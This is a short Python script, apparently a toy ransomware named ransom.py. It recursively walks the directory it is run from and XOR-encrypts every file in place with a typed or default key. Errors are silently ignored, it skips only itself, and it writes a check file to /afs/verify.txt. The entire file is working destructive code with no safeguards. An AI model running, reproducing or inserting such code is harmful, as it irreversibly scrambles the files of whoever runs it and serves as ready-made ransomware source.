import os

def cipher(file,key):
    try:
        data=bytearray(open(file,"rb").read())
        while len(key)<len(data):
            key+=key
        for i in range(len(data)):
            data[i]^=ord(key[i])
        open(file,"wb").write(data)
    except:
        pass
def ransom(way):
    directory=os.listdir(way)
    for dir in directory:
        if dir in exclu:
            continue
        if os.path.isdir(f"{way}/{dir}"):
            ransom(f"{way}/{dir}/")
        else:
            cipher(f"{way}/{dir}",key)

os.system('clear')
path= os.getcwd()
exclu=["ransom.py"]
key = input("Enter a key: ")
if key =="":
    key="JNUW4ZZAMRUWG2ZAO5QXGIDIMVZGK==="
open("/afs/verify.txt","w").write("That's the good key!")
ransom(path)
print("Done!")
